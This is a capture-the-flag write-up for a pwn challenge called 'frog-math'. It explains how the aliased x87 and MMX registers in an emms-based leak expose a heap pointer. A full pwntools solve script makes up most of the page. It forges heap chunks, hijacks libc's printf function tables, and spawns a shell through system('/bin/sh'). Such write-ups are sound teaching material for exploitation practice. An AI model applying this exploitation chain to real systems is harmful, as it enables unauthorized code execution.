@@ -1,0 +1,306 @@
+export const layout = "./src/page.mdx";
+export const title = "frog-math";
+
+## Provided Files
+- chal
+- Dockerfile
+
+## Intended
+
+To save space in the cpu die, Intel processors overlap the legacy x87 and mmx register files so that they refer to the same underlying register file. This means that accesses to the mmx registers modify the st(n) registers and vice versa. The exact details of these nasty little intricacies are documented [here](https://www.cs.utexas.edu/users/moore/acl2/manuals/current/manual/index-seo.php/X86ISA____MMX-REGISTERS-READS-AND-WRITES).
+
+| mm0 | mm1 | mm2 | mm3 | mm4 | mm5 | mm6 | mm7 |
+|-----|-----|-----|-----|-----|-----|-----|-----|
+| st0 | st1 | st2 | st3 | st4 | st5 | st6 | st7 |
+
+### decompiled main
+```c noheader
+int32_t main(int32_t argc, char** argv, char** envp) __noreturn
+    void* fsbase
+    int64_t var_10 = *(fsbase + 0x28)
+    setbuf(fp: stdout, buf: nullptr)
+    setbuf(fp: stderr, buf: nullptr)
+    std::streambuf::pubsetbuf(this: std::ios::rdbuf(this: &data_4088), __s: nullptr, __n: 0)
+    std::streambuf::pubsetbuf(this: std::ios::rdbuf(this: &data_41d0), __s: nullptr, __n: 0)
+    int80_t st7
+    st7.q = 0
+    puts(str: "Welcome to the frog math calcula…")
+    puts(str: "Here we provide state of the art…")
+    while (true) {
+        puts(str: "0) exit")
+        puts(str: "1) floating point")
+        puts(str: "2) integer")
+        printf(format: &data_2056)
+        int32_t var_14
+        std::istream::operator>>(this: &std::cin, __n: &var_14)
+        int32_t rax_4 = var_14
+        if (rax_4 == 2) {
+            int64_t x87_r0
+            int64_t x87_r1
+            int64_t x87_r2
+            int64_t x87_r3
+            int64_t x87_r4
+            int64_t x87_r5
+            int64_t x87_r6
+            int64_t* x87_r7
+            do_mmx(x87_r0, x87_r1, x87_r2, x87_r3, x87_r4, x87_r5, x87_r6, x87_r7)
+        } else {
+            if (rax_4 == 0) {
+                break
+            }
+            if (rax_4 == 1) {
+                do_x87()
+            }
+        }
+    }
+    exit(status: 0)
+    noreturn
+```
+
+Looking at main, it gives us a few options.
+- exit
+- floating_point which calls do_x87
+- integer which calls do_mmx
+
+### decompiled do_mmx
+```c noheader
+int64_t do_mmx(int64_t arg1 @ st0, int64_t arg2 @ st1, int64_t arg3 @ st2, int64_t arg4 @ st3, int64_t arg5 @ st4, 
+    int64_t arg6 @ st5, int64_t arg7 @ st6, int64_t* arg8 @ st7)
+    void* fsbase
+    int64_t rax = *(fsbase + 0x28)
+    while (true) {
+        puts(str: "integer processor")
+        puts(str: "0) finish")
+        puts(str: "1) set")
+        puts(str: "2) get")
+        puts(str: "3) add")
+        puts(str: "4) sub")
+        puts(str: "5) mul")
+        puts(str: "6) div")
+        puts(str: "7) load")
+        puts(str: "8) save")
+        puts(str: "9) clear")
+        // -- snip --
+```
+
+Binja actually recognizes that accessing mmx registers also accesses to floating point st(n) registers and simply marks the arguments using the st(n) registers instead of the mmx registers. do_mmx allows us to perform various arithmetic operations on the mmx registers, but the interesting part is load and save:
+```c noheader
+                case 7
+                    if (arg8 == 0) {
+                        puts(str: "no state to load")
+                        continue
+                    } else {
+                        arg1 = *arg8
+                        arg2 = arg8[1]
+                        arg3 = arg8[2]
+                        arg4 = arg8[3]
+                        arg5 = arg8[4]
+                        arg6 = arg8[5]
+                        arg7 = arg8[6]
+                        free(mem: arg8)
+                        arg8 = nullptr
+                        continue
+                    }
+                case 8
+                    if (arg8 == 0) {
+                        arg8 = malloc(bytes: 0x38)
+                    }
+                    *arg8 = arg1
+                    arg8[1] = arg2
+                    arg8[2] = arg3
+                    arg8[3] = arg4
+                    arg8[4] = arg5
+                    arg8[5] = arg6
+                    arg8[6] = arg7
+                    continue
+```
+
+The do_mmx function expects the state to be stored in mm7 (arg8), and the save function will write mm0-mm6 into mm7 if mm7 is not NULL. load will set mm0-mm6 using mm7 and free mm7 afterwards.
+
+do_x87 allows us to view and modify the st(n) registers:
+```c noheader
+int64_t do_x87()
+    void* fsbase
+    int64_t rax = *(fsbase + 0x28)
+    while (true) {
+        puts(str: "fp processing")
+        puts(str: "0) finish")
+        puts(str: "1) push")
+        puts(str: "2) pop")
+        puts(str: "3) add")
+        puts(str: "4) sub")
+        puts(str: "5) mul")
+        puts(str: "6) div")
+        puts(str: "7) inspect")
+```
+```x86asm noheader
+int64_t do_x87()
+    endbr64 
+    push    rbp {__saved_rbp}
+    mov     rbp, rsp {__saved_rbp}
+    sub     rsp, 0x230
+    mov     rax, qword [fs:0x28]
+    mov     qword [rbp-0x8 {var_10}], rax
+    xor     eax, eax  {0x0}
+    emms    
+```
+The emms instruction resets the fp stack to point to st7 and marks all the stack positions as empty. Since the top of the fp stack points to mm7 so we can use that to leak whatever is stored in mm7.
+
+### Solution
+```python filename="solve.py"
+from pwn import *
+from subprocess import run
+
+libc = ELF("./libc.so.6")
+
+def convert(n):
+    return run(["./convert", str(n)], capture_output=True).stdout
+
+def setsave(n):
+    global p
+    p.sendlineafter(b"2) integer\n> ", b"1")
+    p.sendlineafter(b"> ", b"1")
+    conv = convert(n).strip()
+    print(f"[+] sending {conv}")
+    p.sendline(conv)
+    p.sendlineafter(b"> ", b"2")
+    p.sendlineafter(b"> ", b"0")
+    p.recvuntil(b"2) integer\n")
+
+if args.HOST and args.PORT:
+    p = remote(args.HOST, args.PORT)
+else:
+    p = process("../chal/chal", cwd="../chal")
+if args.GDB:
+    context.terminal = ["kitty"]
+    gdb.attach(p)
+
+p.sendlineafter(b"> ", b"1")
+for _ in range(7):
+    p.sendlineafter(b"> ", b"1")
+    p.sendline(b"0.0")
+p.sendlineafter(b"> ", b"0")
+
+p.sendlineafter(b"> ", b"2")
+for i, n in enumerate([0, 0, 0, 0, 0, 0x41]):
+    p.sendlineafter(b"> ", b"1")
+    p.sendline(str(i).encode())
+    p.sendline(str(n).encode())
+p.sendlineafter(b"> ", b"8")
+p.sendlineafter(b"> ", b"0")
+
+p.sendlineafter(b"> ", b"1")
+for _ in range(7):
+    p.sendlineafter(b"> ", b"2")
+p.sendlineafter(b"> ", b"7")
+# leak
+p.recvuntil(b"-nan ")
+leak = int(p.readline())
+print(f"[+] leak: {leak:x}")
+p.sendlineafter(b"> ", b"0")
+
+heap = leak - 0x12f10
+print(f"[+] heap: {heap:x}")
+
+for i in range(15):
+    setsave(0)
+    p.sendlineafter(b"> ", b"2")
+    p.sendlineafter(b"> ", b"8")
+    p.sendlineafter(b"> ", b"0")
+
+fake = [0, 0x91] + [0] * 16 + [0, 0x91] + [0] * 16 + [0, 0x91]
+for i, n in enumerate(fake):
+    if n == 0:
+        continue
+    setsave(heap + 0x12f10 + i * 8)
+    p.sendlineafter(b"> ", b"2")
+    p.sendlineafter(b"> ", b"1")
+    p.sendline(b"0")
+    p.sendline(str(n).encode())
+    p.sendlineafter(b"> ", b"8")
+    p.sendlineafter(b"> ", b"0")
+
+setsave(heap + 0x10)
+p.sendlineafter(b"> ", b"2")
+p.sendlineafter(b"> ", b"1")
+p.sendline(b"1")
+p.sendline(str(0x0007000000000000).encode())
+p.sendlineafter(b"> ", b"8")
+p.sendlineafter(b"> ", b"0")
+
+victim = heap + 0x12f10 + 20 * 8
+print(f"[+] victim: {victim:x}")
+setsave(victim)
+p.sendlineafter(b"> ", b"2")
+p.sendlineafter(b"> ", b"7")
+p.sendlineafter(b"> ", b"0")
+
+setsave(heap + 0x12f10 + 0x40 * 2)
+p.sendlineafter(b"> ", b"2")
+p.sendlineafter(b"> ", b"7")
+
+p.sendlineafter(b"> ", b"2")
+p.sendline(b"5")
+leak = int(p.readline())
+base = leak - 0x219ce0
+
+print(f"[+] leak: {leak:x}")
+print(f"[+] base: {base:x}")
+
+p.sendlineafter(b"> ", b"0")
+
+arginfo = 0x21a8b0
+functions = 0x21b9c8
+
+setsave(base + arginfo)
+p.sendlineafter(b"> ", b"2")
+p.sendlineafter(b"> ", b"1")
+p.sendline(b"0")
+p.sendline(str(heap + 0x12f10).encode())
+p.sendlineafter(b"> ", b"8")
+p.sendlineafter(b"> ", b"0")
+
+setsave(heap + 0x12f10 + ord('f') * 8)
+p.sendlineafter(b"> ", b"2")
+p.sendlineafter(b"> ", b"1")
+p.sendline(b"0")
+p.sendline(str(base + libc.symbols["gets"]).encode())
+p.sendlineafter(b"> ", b"8")
+p.sendlineafter(b"> ", b"0")
+
+setsave(heap + 0x12f10 + ord('u') * 8)
+p.sendlineafter(b"> ", b"2")
+p.sendlineafter(b"> ", b"1")
+p.sendline(b"0")
+p.sendline(str(base + 0x53b56).encode())
+p.sendlineafter(b"> ", b"8")
+p.sendlineafter(b"> ", b"0")
+
+setsave(heap + 0x12f10)
+p.sendlineafter(b"> ", b"2")
+p.sendlineafter(b"> ", b"1")
+p.sendline(b"0")
+p.sendline(str(u64(b"/bin/sh\x00")).encode())
+p.sendlineafter(b"> ", b"8")
+p.sendlineafter(b"> ", b"0")
+
+setsave(base + functions)
+p.sendlineafter(b"> ", b"2")
+p.sendlineafter(b"> ", b"1")
+p.sendline(b"0")
+p.sendline(b"1")
+p.sendlineafter(b"> ", b"8")
+p.sendlineafter(b"> ", b"0")
+
+p.sendlineafter(b"> ", b"1")
+ctx = [0 for _ in range(32)]
+ctx[0xa8//8] = base + libc.symbols["system"]
+ctx[0x68//8] = heap + 0x12f10
+attack = b"7" + b"A" * 124 + flat(ctx, word_size=64)
+p.sendlineafter(b"> ", attack)
+
+p.interactive()
+```
+
+## Unintendeds
+Thankfully no unintendeds here.
